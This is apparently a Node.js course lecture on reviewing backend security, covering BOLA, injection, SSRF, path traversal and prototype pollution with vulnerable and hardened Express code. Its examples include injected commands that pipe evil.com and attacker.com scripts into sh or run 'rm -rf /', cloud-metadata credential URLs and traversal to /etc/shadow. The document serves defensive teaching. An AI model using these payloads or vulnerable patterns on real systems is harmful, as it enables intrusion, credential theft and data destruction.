# Day 38: Security Review of a Node Backend

<nav aria-label="Lecture navigation">

[Previous: Observability and Production Operations](day-37-observability-and-production-operations.md) | [Roadmap](../node-roadmap.md) | [Next: Testing Strategy Across Boundaries](day-39-testing-strategy-across-boundaries.md)

</nav>

## Prerequisites

- [Day 19: Authentication and Authorization Boundaries](day-19-authentication-and-authorization-boundaries.md) — Dual-token architecture, BOLA defense, and permission guards.
- [Day 20: Express Security and HTTP Testing](day-20-express-security-and-http-testing.md) — Helmet headers, CORS policies, and rate-limiting perimeter.
- [Day 33: Layered Backend Architecture](day-33-layered-backend-architecture.md) — DTO boundaries and input perimeter filtering.
---

## Core Concepts

```
┌─────────────────────────────────────────────────────────────────────────────────────────────┐
│                          ARCHITECTURAL TRUST BOUNDARIES IN NODE.JS                          │
└─────────────────────────────────────────────────────────────────────────────────────────────┘

  [ UNTRUSTED ZONE: Public Internet / HTTP Clients ]
                        │
                        ▼ ◄─── TRUST BOUNDARY 1: Edge Perimeter
  [ REVERSE PROXY: NGINX / Cloudflare / AWS ALB ]
  • TLS Termination, DDoS Shield, Rate Limiting, Host Header Validation
                        │
                        ▼ ◄─── TRUST BOUNDARY 2: Transport & Authentication
  [ NODE.JS EXPRESS PROCESS ]
  • Zod Input Validation, JWT Authentication, BOLA Ownership Scoping
  • Prototype Pollution Defense, ReDoS Timeout Guards
                        │
        ┌───────────────┼───────────────┬────────────────────────┐
        ▼               ▼               ▼                        ▼
    BOUNDARY 3      BOUNDARY 4      BOUNDARY 5               BOUNDARY 6
   [ DATABASE ]    [ FILESYSTEM ]  [ EXTERNAL APIS ]       [ OS SUBSYSTEM ]
   Parameterized   Safe Path       SSRF IP Filter          execFile (No Shell)
   SQL ($1, $2)    Containment     & DNS Rebind Guard      Permission Model
```

### 1. Broken Object Level Authorization (BOLA / IDOR)

> **BOLA / IDOR**: Broken Object Level Authorization: an access control defect where an API allows users to manipulate objects they do not own by swapping resource IDs.

BOLA occurs when an API endpoint accepts a resource identifier (such as a database UUID or integer ID) from the client and retrieves or mutates that resource without verifying whether the authenticated user actually owns it:

```javascript
// Node.js code
// anti-pattern: Classic BOLA / IDOR vulnerability
app.get('/api/documents/:documentId', async (req, res) => {
  // ❌ Attacker Alice logs in, obtains a valid JWT, and requests /api/documents/doc_999 (Bob's document).
  // The route checks if Alice is authenticated, but NOT if she owns doc_999!
  const { rows } = await pool.query('SELECT * FROM documents WHERE id = $1', [req.params.documentId]);
  res.json(rows[0]);
});

// pattern: Database-scoped ownership authorization
app.get('/api/documents/:documentId', async (req, res) => {
  // ✅ The database query strictly scopes the filter to the authenticated user's tenant/account!
  const query = `
    SELECT id, title, content, created_at
    FROM documents
    WHERE id = $1 AND organization_id = $2;
  `;
  const { rows } = await pool.query(query, [req.params.documentId, req.user.orgId]);

  if (rows.length === 0) {
    // Return 404 Not Found (instead of 403) to prevent ID enumeration scanning!
    return res.status(404).json({ error: 'Document not found' });
  }

  res.json(rows[0]);
});
```

---

### 2. Injection Attacks: NoSQL, SQL, and OS Command

Injection occurs when untrusted data is concatenated or interpolated directly into an interpreter (SQL engine, MongoDB query parser, or operating system shell).

#### NoSQL Operator Injection (MongoDB)
When Express parses JSON bodies, an attacker can submit an object containing MongoDB query operators instead of a scalar string:
```javascript
// Attacker sends JSON: { "username": "admin", "password": { "$ne": null } }
// ❌ If unvalidated: db.users.findOne({ username: req.body.username, password: req.body.password })
// Translates to: WHERE username = 'admin' AND password != null
// Result: Attacker logs in as admin WITHOUT KNOWING THE PASSWORD!
```
**Fix:** Validate input strictly with Zod schemas: `z.string()` automatically rejects objects and arrays.

#### OS Command Injection
Executing system binaries using `child_process.exec` passes the input string directly to the OS shell (`/bin/sh` or `cmd.exe`). Attackers inject shell metacharacters (`;`, `|`, `&&`, `` ` ``):
```javascript
// Node.js code
// anti-pattern: Shell execution with unescaped input
import { exec } from 'node:child_process';
// ❌ If untrustedFileName is: "report.pdf; rm -rf /"
exec(`convert ${untrustedFileName} output.png`); // CATASTROPHIC REMOTE CODE EXECUTION!

// pattern: Safe binary invocation via execFile (No shell spawning)
import { execFile } from 'node:child_process';
// ✅ execFile bypasses the OS shell entirely, passing arguments as a discrete string vector!
execFile('/usr/bin/convert', [untrustedFileName, 'output.png'], (error, stdout) => {
  // Shell operators (;, &&, |) are treated strictly as literal file name text!
});
```

---

### 3. Server-Side Request Forgery (SSRF) and Cloud Metadata Protection

> **SSRF**: Server-Side Request Forgery: tricking a backend server into making outbound HTTP requests to internal, private network targets.

SSRF occurs when an application accepts a URL from a user (e.g., an avatar image URL or webhook destination) and uses `fetch()` or `axios` to download it from the server.

Attackers supply URLs targeting:
1. Cloud Metadata Services: `http://169.254.169.254/latest/meta-data/iam/security-credentials/` (steals AWS EC2/ECS IAM keys).
2. Internal Private VPCs: `http://10.0.0.5:8080/admin` or `http://localhost:6379` (compromises internal Redis/databases).

```javascript
// Node.js code
// pattern: Robust SSRF Defense with IP Blocklisting & DNS Resolution
import dns from 'node:dns/promises';
import ipaddr from 'ipaddr.js';

export async function validateSafeOutboundUrl(rawUrl) {
  const parsed = new URL(rawUrl);

  // 1. Enforce safe protocol
  if (!['http:', 'https:'].includes(parsed.protocol)) {
    throw new Error('Illegal protocol');
  }

  // 2. Resolve DNS hostname to raw IP addresses
  const resolvedIps = await dns.resolve4(parsed.hostname);

  for (const ip of resolvedIps) {
    const addr = ipaddr.parse(ip);
    const range = addr.range();

    // 3. Block private, loopback, link-local, and cloud metadata ranges
    if (
      range === 'loopback' ||      // 127.0.0.0/8
      range === 'private' ||       // 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16
      range === 'linkLocal' ||     // 169.254.0.0/16 (AWS Cloud Metadata!)
      range === 'carrierGradeNat'  // 100.64.0.0/10
    ) {
      throw new Error(`SSRF Blocked: IP ${ip} resolves to a private network.`);
    }
  }

  return parsed.href;
}
```

---

### 4. Path Traversal and Safe Path Containment

> **Safe Path Containment**: Validating that a normalized file path resides strictly inside an allowed root directory before executing filesystem calls.

When an API reads files from disk based on user parameters, attackers use `../` sequences to escape the designated folder:

```javascript
// Node.js code
// anti-pattern: Naive path concatenation
import path from 'node:path';
import fs from 'node:fs/promises';

// ❌ Attacker passes: ?file=../../../../etc/passwd
const unsafePath = path.join('/var/app/uploads', req.query.file);
await fs.readFile(unsafePath); // Leaks arbitrary server files!

// pattern: Safe Path Containment Verification
export function resolveSafePath(rootDir, untrustedRelativePath) {
  // 1. Resolve absolute canonical path
  const safeRoot = path.resolve(rootDir);
  const resolvedTarget = path.resolve(safeRoot, untrustedRelativePath);

  // 2. Strict prefix verification
  if (!resolvedTarget.startsWith(safeRoot + path.sep)) {
    throw new Error('Access Denied: Path traversal detected');
  }

  return resolvedTarget;
}
```

---

### 5. Prototype Pollution and ReDoS Defense

> **ReDoS**: Regular Expression Denial of Service: catastrophic polynomial or exponential backtracking in regex evaluation over untrusted input.

> **Prototype Pollution**: Injecting properties into JavaScript's `Object.prototype` via recursive merge or JSON deserialization (`__proto__`).

#### Prototype Pollution
Occurs when recursive object merge functions assign properties using user-controlled keys without blocking `__proto__`, `constructor`, or `prototype`:
```javascript
// Node.js code
// pattern: Safe object cloning and sanitization
export function safeMerge(target, source) {
  const SENSITIVE_KEYS = new Set(['__proto__', 'constructor', 'prototype']);

  for (const key of Object.keys(source)) {
    if (SENSITIVE_KEYS.has(key)) {
      continue; // Block prototype poisoning!
    }
    if (typeof source[key] === 'object' && source[key] !== null && !Array.isArray(source[key])) {
      if (!target[key]) target[key] = Object.create(null); // Null-prototype dictionary
      safeMerge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}
```

#### ReDoS (Regular Expression Denial of Service)
Evaluating vulnerable regular expressions (such as `^(a+)+$`) against malicious strings like `"aaaaaaaaaaaaaaaaaaaaX"` triggers exponential backtracking ($O(2^N)$), freezing the single-threaded event loop.
- **Remediation:** Validate regexes with static analyzers (e.g., `safe-regex`), prefer non-backtracking native parsers, or execute complex regex matches inside isolated Worker Threads with execution timeouts.

---

## Detailed Explanations and Traces

### STRIDE Threat Modeling for a Node.js Backend

Applying the STRIDE framework ensures complete coverage across all system components:

```
┌─────────────────────────────────────────────────────────────────────────────────────────────┐
│                             THE STRIDE THREAT MODEL APPLIED                                 │
└─────────────────────────────────────────────────────────────────────────────────────────────┘

  Threat Category           Vector in Node.js                 Mitigation Control
 ─────────────────────────────────────────────────────────────────────────────────────────────
  S - Spoofing Identity     Stolen JWT / IP forgery           Signed HMAC/RSA JWTs, trust proxy guard
  T - Tampering with Data   SQLi, NoSQLi, Prototype Poison    Parameterized queries, Zod, Object.freeze
  R - Repudiation           Untracked administrative actions  Immutable structured audit logs, WORM storage
  I - Information Leak      Stack traces, unredacted logs     RFC 7807 problem details, Pino log redaction
  D - Denial of Service     ReDoS, Event-Loop Freeze, Memory  Rate limiting, payload limits, execFile
  E - Elevation of Priv     BOLA / IDOR, Broken Role Guards   Database-scoped queries, RBAC/ABAC guards
```

---

## Common Mistakes and Interview Traps

### 1. Treating CORS as a Server-Side Security Barrier

A dangerous and common misconception is believing that configuring CORS protects backend data from attackers:
- **Reality:** CORS is an instruction to the **browser** to restrict JavaScript from reading responses. It does not stop an attacker using `curl`, Python, Postman, or a custom script from calling your API directly. Server-side security must be enforced through authentication tokens, CSRF tokens, and authorization checks.

### 2. Leaking Database Connection Strings and Stack Traces

In development, Express outputs full error stack traces to clients. In production, stack traces leak database table names, SQL syntax, internal file directory paths, and framework versions. Always suppress stack traces in production (`process.env.NODE_ENV === 'production'`).

---

## Hands-On Exercise: Auditing and Hardening an Express Vulnerability Suite

### Scenario

You are conducting a security audit of a document management API. The legacy codebase contains five critical vulnerabilities:
1. BOLA in document retrieval allowing cross-tenant data leaks.
2. Unsanitized file downloads permitting Path Traversal (`/etc/passwd`).
3. SSRF vulnerability in a webhook notification dispatcher.
4. OS command injection in a PDF watermark utility.
5. Insecure direct object creation permitting prototype pollution.

### Buggy Code

```javascript
// Node.js code
// anti-pattern: Sprawling Vulnerability Suite
import express from 'express';
import fs from 'node:fs/promises';
import { exec } from 'node:child_process';

export const vulnerableApp = express();
vulnerableApp.use(express.json());

// VULNERABILITY 1: BOLA / IDOR
vulnerableApp.get('/api/docs/:id', async (req, res) => {
  const doc = await db.query('SELECT * FROM docs WHERE id = $1', [req.params.id]);
  res.json(doc.rows[0]); // Returns document without checking req.user.orgId!
});

// VULNERABILITY 2: Path Traversal
vulnerableApp.get('/api/download', async (req, res) => {
  const filePath = `/var/data/files/${req.query.filename}`;
  const data = await fs.readFile(filePath); // Path traversal: ?filename=../../etc/shadow
  res.send(data);
});

// VULNERABILITY 3: SSRF
vulnerableApp.post('/api/webhook/test', async (req, res) => {
  // Attacker sends: { "targetUrl": "http://169.254.169.254/latest/meta-data/" }
  const response = await fetch(req.body.targetUrl);
  res.json({ status: response.status });
});

// VULNERABILITY 4: OS Command Injection
vulnerableApp.post('/api/watermark', (req, res) => {
  // Attacker sends: { "text": "Confidential; curl evil.com/shell | sh" }
  exec(`pdftk doc.pdf stamp stamp.pdf output out.pdf user_text "${req.body.text}"`, (err) => {
    res.json({ done: true });
  });
});
```

### Acceptance Criteria

1. Fix BOLA: Enforce database-level scoping using `req.user.orgId` and return `404` for unauthorized attempts.
2. Fix Path Traversal: Implement canonical directory resolution and strict prefix containment.
3. Fix SSRF: Resolve DNS hostnames and block all private, loopback, and link-local (cloud metadata) IP addresses.
4. Fix Command Injection: Replace `exec` with `execFile`, passing arguments as a discrete array without shell invocation.
5. Provide a hardened Express app with comprehensive error handling.

### Solution Code

```javascript
// Node.js code
import express from 'express';
import path from 'node:path';
import fs from 'node:fs/promises';
import dns from 'node:dns/promises';
import { execFile } from 'node:child_process';
import ipaddr from 'ipaddr.js';
import { z } from 'zod';

export const hardenedApp = express();
hardenedApp.use(express.json({ limit: '100kb' })); // Guard against oversized payload DoS

// ==========================================
// 1. REMEDIATED: BOLA Ownership Scoping
// ==========================================

hardenedApp.get('/api/docs/:id', async (req, res, next) => {
  try {
    const docId = z.string().uuid().parse(req.params.id);
    const orgId = req.user.orgId; // Injected by verified auth middleware

    // Query strictly constrained to authenticated user's organization
    const query = `
      SELECT id, title, content, updated_at
      FROM docs
      WHERE id = $1 AND organization_id = $2;
    `;
    const { rows } = await req.db.query(query, [docId, orgId]);

    if (rows.length === 0) {
      // 404 prevents ID harvesting / enumeration attacks
      return res.status(404).json({ error: 'Document not found' });
    }

    res.json({ data: rows[0] });
  } catch (err) {
    next(err);
  }
});

// ==========================================
// 2. REMEDIATED: Safe Path Containment
// ==========================================

const BASE_UPLOAD_DIR = path.resolve('/var/data/files');

hardenedApp.get('/api/download', async (req, res, next) => {
  try {
    const filename = z.string().min(1).max(255).parse(req.query.filename);

    // Resolve canonical absolute path
    const safeTargetPath = path.resolve(BASE_UPLOAD_DIR, filename);

    // Enforce containment within authorized boundary
    if (!safeTargetPath.startsWith(BASE_UPLOAD_DIR + path.sep)) {
      return res.status(403).json({ error: 'Access forbidden: Path traversal detected' });
    }

    const fileBuffer = await fs.readFile(safeTargetPath);
    res.setHeader('Content-Type', 'application/octet-stream');
    res.send(fileBuffer);
  } catch (err) {
    if (err.code === 'ENOENT') {
      return res.status(404).json({ error: 'File not found' });
    }
    next(err);
  }
});

// ==========================================
// 3. REMEDIATED: SSRF & Cloud Metadata Shield
// ==========================================

async function verifySafePublicUrl(rawUrl) {
  const parsed = new URL(rawUrl);

  if (!['http:', 'https:'].includes(parsed.protocol)) {
    throw new Error('Only HTTP and HTTPS protocols are permitted');
  }

  // Resolve DNS to verify all destination IPs
  const resolvedIps = await dns.resolve4(parsed.hostname);
  if (resolvedIps.length === 0) {
    throw new Error('Unable to resolve domain');
  }

  for (const ip of resolvedIps) {
    const addr = ipaddr.parse(ip);
    const range = addr.range();

    // Block private ranges and 169.254.0.0/16 AWS/GCP cloud metadata
    if (['loopback', 'private', 'linkLocal', 'carrierGradeNat'].includes(range)) {
      throw new Error(`Access to private address space (${ip}) is strictly forbidden`);
    }
  }

  return parsed.href;
}

hardenedApp.post('/api/webhook/test', async (req, res, next) => {
  try {
    const rawUrl = z.string().url().parse(req.body.targetUrl);
    const safeUrl = await verifySafePublicUrl(rawUrl);

    // Dispatched safely with strict timeout
    const response = await fetch(safeUrl, {
      signal: AbortSignal.timeout(3000),
      redirect: 'error' // Prevent redirect-based SSRF bypasses!
    });

    res.json({ status: response.status });
  } catch (err) {
    res.status(400).json({ error: 'Invalid or restricted webhook URL', detail: err.message });
  }
});

// ==========================================
// 4. REMEDIATED: Command Injection Neutralized
// ==========================================

hardenedApp.post('/api/watermark', async (req, res, next) => {
  try {
    const watermarkText = z.string().max(100).parse(req.body.text);

    // Safe execution: execFile bypasses the shell completely!
    // Shell operators (;, &&, |) are treated strictly as scalar string arguments.
    execFile(
      '/usr/bin/pdftk',
      ['doc.pdf', 'stamp', 'stamp.pdf', 'output', 'out.pdf', 'user_text', watermarkText],
      { timeout: 5000 },
      (err) => {
        if (err) {
          return next(err);
        }
        res.json({ success: true });
      }
    );
  } catch (err) {
    next(err);
  }
});
```

### Solution Explanation

1. **BOLA Ownership Scoping:** In `/api/docs/:id`, the query filters on both `id = $1` and `organization_id = $2`. Even if an attacker guesses a valid UUID belonging to another organization, PostgreSQL returns 0 rows, and the API cleanly returns `404 Not Found`.
2. **Path Containment:** The download handler uses `path.resolve` followed by `safeTargetPath.startsWith(BASE_UPLOAD_DIR + path.sep)`. Any payload containing `../` that attempts to escape the root directory is intercepted and rejected with `403 Forbidden`.
3. **SSRF Multi-Vector Defense:** In `/api/webhook/test`, the handler resolves the domain's A-records using `dns.resolve4()`, parsing the resulting IPs with `ipaddr.js`. Any request attempting to hit `127.0.0.1`, `10.0.0.0/8`, or the cloud metadata service `169.254.169.254` is blocked. Additionally, `redirect: 'error'` ensures attackers cannot bypass checks via open HTTP redirects.
4. **Command Injection Elimination:** `execFile` executes the binary directly as an OS process without invoking `/bin/sh` or `cmd.exe`. Metacharacters like `; rm -rf /` are passed strictly as literal text strings into the argument array, neutralizing command injection entirely.

---

## Summary

- Security controls must be implemented at every **Trust Boundary** using the STRIDE threat model.
- **BOLA / IDOR** is eliminated by scoping database queries to the authenticated tenant (`WHERE id = $1 AND org_id = $2`).
- Prevent NoSQL operator injection by validating request types strictly with Zod (`z.string()`).
- Stop OS command injection by replacing shell-spawning `child_process.exec` with argument-vector APIs like `child_process.execFile`.
- Defend against SSRF by resolving DNS hostnames and blocking loopback, private, and cloud metadata (`169.254.169.254`) IP addresses.
- Prevent path traversal by combining `path.resolve` with directory prefix containment validation.

---

## Cheat Sheet

| Threat Category | Vulnerability Pattern | Hardened Countermeasure |
|---|---|---|
| **BOLA / IDOR** | `SELECT * FROM tbl WHERE id = $1` | `WHERE id = $1 AND tenant_id = $2` |
| **NoSQL Injection**| Unvalidated JSON queries (`$ne`, `$gt`)| Parse inputs with `z.string()` in Zod |
| **Command Injection**| `exec("tool " + userInput)` | `execFile('/path/bin', [userInput])` |
| **Path Traversal** | `path.join('/root', filename)` | `path.resolve()` + `startsWith(root + path.sep)` |
| **SSRF** | `fetch(untrustedUrl)` | Resolve DNS $\to$ block `169.254.0.0/16` & private ranges |
| **Prototype Poison**| `target[key] = source[key]` | Block `__proto__`, `constructor`, `prototype` |
| **ReDoS** | Nested quantifiers `(a+)+` | Use non-backtracking regex or worker threads |

---

## Interview Questions

### 1. What is Broken Object Level Authorization (BOLA/IDOR), why is it the most prevalent vulnerability in modern APIs, and how is it eliminated at the database layer?

Broken Object Level Authorization (BOLA, formerly known as Insecure Direct Object References or IDOR) occurs when an application exposes a resource identifier in an API route (e.g., `/api/invoices/:id`) and performs an operation on that resource based solely on the user being authenticated, without verifying whether the user is authorized to access that specific entity.

It is the most prevalent vulnerability in modern APIs because modern architectures rely heavily on decoupled front-ends (React, mobile apps) communicating with REST/GraphQL APIs via resource IDs. Developers often implement authentication middleware (verifying that a JWT is valid), but assume that because an endpoint requires authentication, authorization is satisfied.

BOLA is permanently eliminated at the **Persistence Layer** by scoping database queries to the authenticated user's organization or account:
```sql
-- Anti-Pattern (Vulnerable to BOLA):
SELECT * FROM invoices WHERE id = $1;

-- Hardened Pattern:
SELECT * FROM invoices WHERE id = $1 AND organization_id = $2;
```
By passing the authenticated tenant ID (`req.user.orgId`) directly from the verified session into the SQL parameter array, the database engine enforces data isolation. If a user attempts to access an ID belonging to another company, the database returns zero matching rows. The API should return `404 Not Found` rather than `403 Forbidden` to prevent attackers from enumerating valid IDs.

---

### 2. How does Server-Side Request Forgery (SSRF) allow attackers to compromise cloud environments (such as AWS EC2 or ECS), and what is the multi-layered defense strategy against it?

In cloud infrastructure, instances (such as AWS EC2 instances, ECS tasks, or Kubernetes pods) communicate with a local link-local HTTP service known as the **Instance Metadata Service (IMDS)** located at the non-routable IP `http://169.254.169.254`. This service supplies runtime credentials, including temporary IAM role secret keys and security tokens.

If an application accepts a user-provided URL (e.g., for importing an avatar or verifying a webhook) and fetches it on the server:
- An attacker submits: `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>`.
- The Node.js server fetches the URL from its internal network interface and returns the response.
- The attacker receives the AWS secret access key and session token, completely taking over the cloud account.

**Multi-Layered Defense Strategy:**
1. **Protocol Allowlisting:** Restrict protocols strictly to `http:` and `https:`. Block `file:`, `ftp:`, `gopher:`.
2. **DNS Resolution & IP Verification:** Before making the request, resolve the domain name to its IPv4/IPv6 addresses using `dns.resolve4()`. Inspect the resolved IPs using an IP parsing library (`ipaddr.js`) and reject any IP that falls into private ranges (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`), loopback (`127.0.0.1`), or link-local space (`169.254.0.0/16`).
3. **Disable Redirects:** Configure the HTTP client with `redirect: 'error'`. Attackers frequently use an authorized external URL that issues a `302 Found` redirecting to `169.254.169.254`.
4. **Enforce IMDSv2:** In AWS, mandate IMDSv2, which requires a session token obtained via an HTTP `PUT` request with custom headers, neutralizing simple `GET`-based SSRF exploits.

---

### 3. What is the difference between `child_process.exec` and `child_process.execFile` in Node.js, and how does `execFile` prevent Command Injection?

The critical security distinction lies in **whether an operating system shell is spawned**:

- **`child_process.exec(commandString)`** passes the provided string to an operating system system shell (`/bin/sh` on Linux, `cmd.exe` on Windows). The shell parses the entire string, evaluating shell metacharacters such as pipes (`|`), command separators (`;`), redirects (`>`), and command substitutions (`` `command` `` or `$(command)`). If untrusted user input is concatenated into `commandString`:
  ```javascript
  exec(`cat ${userInput}`);
  ```
  An attacker providing `file.txt; curl http://attacker.com/malware | sh` forces the shell to execute their injected command with full process privileges.

- **`child_process.execFile(file, argsArray)`** invokes the executable binary directly via operating system system calls (such as `execve` on POSIX) **without spawning a shell**. The arguments are passed as an array of discrete string pointers directly to the executable. Because no shell exists to interpret commands, shell metacharacters like `;`, `|`, and `&&` have no special meaning; they are treated strictly as literal string arguments passed to the binary. An input of `file.txt; rm -rf /` is treated merely as a search for a file named `file.txt; rm -rf /`, completely neutralizing command injection.

---

### 4. What is Prototype Pollution in JavaScript, how does it manifest in a Node.js API, and how do you protect an application from it?

JavaScript objects inherit properties and methods from their prototype chain (`Object.prototype`). **Prototype Pollution** occurs when an attacker injects or modifies properties on `Object.prototype`, causing those properties to become visible on **all** JavaScript objects created across the entire Node.js runtime process.

It typically manifests when applications accept untrusted JSON payloads and pass them into recursive object merging, deep cloning, or path-assignment functions:
```javascript
// Attacker sends JSON:
{ "__proto__": { "isAdmin": true } }
```
If an unhardened merge utility traverses the object:
```javascript
target[key] = source[key];
```
When `key` is `"__proto__"`, this assigns properties directly to `Object.prototype`. Consequently, every object in the application now inherits `isAdmin = true`. An authorization check like:
```javascript
if (user.isAdmin) { /* grant access */ }
```
evaluates to `true` for every user in the system, resulting in complete privilege escalation.

**Protection Controls:**
1. **Key Filtering:** Explicitly block access to sensitive keys (`__proto__`, `constructor`, `prototype`) in all recursive merge functions.
2. **Prototype-less Dictionaries:** For objects used as key-value dictionaries, instantiate them using `Object.create(null)` or `Map`, which have no prototype chain.
3. **`Object.freeze`:** Call `Object.freeze(Object.prototype)` at application startup to prevent any runtime modification of the base prototype.
4. **Use Hardened Libraries:** Use modern, actively patched versions of libraries like `lodash` or native `structuredClone()`.

---

<nav aria-label="Lecture navigation">

[Previous: Observability and Production Operations](day-37-observability-and-production-operations.md) | [Roadmap](../node-roadmap.md) | [Next: Testing Strategy Across Boundaries](day-39-testing-strategy-across-boundaries.md)

</nav>